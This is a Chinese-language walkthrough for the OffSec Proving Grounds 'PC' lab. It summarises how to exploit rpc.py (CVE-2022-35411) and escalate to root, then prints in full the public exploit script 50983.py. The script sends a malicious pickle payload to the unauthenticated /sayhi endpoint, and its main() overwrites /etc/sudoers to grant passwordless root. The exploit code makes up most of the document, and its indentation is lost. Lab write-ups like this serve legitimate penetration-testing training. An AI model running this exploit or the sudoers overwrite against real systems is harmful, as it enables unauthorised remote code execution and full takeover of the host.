offSec官方参考教程  
[https://www.offsec.com/blog/cve-2024-12029/?utm_campaign=9872414-2025-Technical-Blog&utm_content=339027509&utm_medium=social&utm_source=linkedin&hss_channel=lcp-5384047](https://www.offsec.com/blog/cve-2024-12029/?utm_campaign=9872414-2025-Technical-Blog&utm_content=339027509&utm_medium=social&utm_source=linkedin&hss_channel=lcp-5384047)
       
参考资料：  
[https://medium.com/@huwanyu94/proving-grounds-practice-pc-walkthrough-bde8a032c1b4](https://medium.com/@huwanyu94/proving-grounds-practice-pc-walkthrough-bde8a032c1b4)
 
总结  
枚举服务并识别在端口 65432 上运行的 RPC 服务器。  
确认使用了 rpc.py，并确认其存在 CVE-2022-35411 漏洞。  
构造并发送恶意 pickle 有效载荷，通过 RPC 服务器执行任意命令。  
利用漏洞设置 /bin/bash 的 SUID 位，从而实现权限提升。  
执行 /bin/bash -p 以提升权限并获得 root 访问权限。
   

50983.py:  
└─$ cat 50983.py  
# Exploit Title: rpc.py 0.6.0 - Remote Code Execution (RCE)  
# Google Dork: N/A  
# Date: 2022-07-12  
# Exploit Author: Elias Hohl  
# Vendor Homepage: [https://github.com/abersheeran](https://github.com/abersheeran)  
# Software Link: [https://github.com/abersheeran/rpc.py](https://github.com/abersheeran/rpc.py)  
# Version: v0.4.2 - v0.6.0  
# Tested on: Debian 11, Ubuntu 20.04  
# CVE : CVE-2022-35411
 
import requests  
import pickle
 
# Unauthenticated RCE 0-day for [https://github.com/abersheeran/rpc.py](https://github.com/abersheeran/rpc.py)
 
HOST = "127.0.0.1:65432"
 
URL = f"http://{HOST}/sayhi"
 
HEADERS = {  
"serializer": "pickle"  
}
   

def generate_payload(cmd):
 
class PickleRce(object):  
def __reduce__(self):  
import os  
return os.system, (cmd,)
 
payload = pickle.dumps(PickleRce())
 
print(payload)
 
return payload
   

def exec_command(cmd):
 
payload = generate_payload(cmd)
 
requests.post(url=URL, data=payload, headers=HEADERS)
   

def main():  
exec_command('echo "user ALL=(root)NOPASSWD:ALL"\>/etc/sudoers')  
# exec_command('uname -a')
   

if __name__ == "__main__":  
main()